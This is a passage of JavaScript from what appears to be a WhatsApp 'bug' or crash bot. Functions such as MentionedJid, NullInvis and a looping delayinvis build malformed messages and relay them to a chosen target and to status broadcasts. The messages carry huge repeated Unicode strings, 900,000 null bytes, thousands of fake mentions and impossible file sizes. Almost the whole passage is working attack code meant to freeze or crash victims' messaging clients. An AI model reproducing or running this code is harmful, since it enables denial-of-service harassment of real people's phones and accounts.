                                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1735456100",
                                contactVcard: true,
                                caption: "",
                            },
                        },
                    },
                    body: {
                        text: " " + "ꦽ".repeat(100000),
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(10000),
                                    id: null
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(10000),
                                    id: null
                                })
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(10000),
                                    url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                                })
                            },
                            {
                                name: "cta_copy",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "𑜦𑜠".repeat(10000),
                                    copy_code: "𑜦𑜠".repeat(10000)
                                })
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: JSON.stringify({
                                    icon: "PROMOTION",
                                    flow_cta: "PAYMENT_PROMOTION",
                                    flow_message_version: "3"
                                })
                            }
                        ],
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, MentionedJidMsg, {
        messageId: sock.generateMessageTag(),
        participant: { jid: target }
    });
}

async function MentionedJid(sock, target) {
  const MentionedJidMsg = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "Gw Rizz Bang‌",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text: " " + "ꦽ".repeat(100000),
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "quick_reply",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  id: null
                })
              },
              {
                name: "cta_url",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  url: "https://" + "𑜦𑜠".repeat(10000) + ".com"
                })
              },
              {
                name: "cta_copy",
                buttonParamsJson: JSON.stringify({
                  display_text: "𑜦𑜠".repeat(10000),
                  copy_code: "𑜦𑜠".repeat(10000)
                })
              },
              {
                name: "galaxy_message",
                buttonParamsJson: JSON.stringify({
                  icon: "PROMOTION",
                  flow_cta: "PAYMENT_PROMOTION",
                  flow_message_version: "3"
                })
              }
            ],
          },
        },
      },
    },
  };
  await sock.relayMessage(target, MentionedJidMsg, {
    messageId: sock.generateMessageTag(),
    participant: { jid: target }
  });
  await sock.relayMessage(
    "status@broadcast",
    MentionedJidMsg,
    {
      messageId: sock.generateMessageTag(),
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target } }
              ]
            }
          ]
        }
      ]
    }
  );
}

async function NullInvis(sock, target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "Propaganda",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid: target });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
// SCMD MENU
async function delayinvis(target) {
  for (let i = 0; i < 10; i++) {
    for (let p = 1; p <= 100; p++) {
      console.log(chalk.yellow(`⏳ Progress: ${p}%`));
      await new Promise(res => setTimeout(res, 30));
    }
    await privatedelay();      
       await ctarlResponse(target);
       await glorymessage(target);
       await obfuspot(target);
    await gsGlx(target);
    await ctarlResponse(target);
    await gsGlx(target);
    await ctarlResponse(target);
    await gsGlx(target);
    await new Promise(res => setTimeout(res, 500));
  }
}
//Kode Error
//END DISINI
bot.launch()
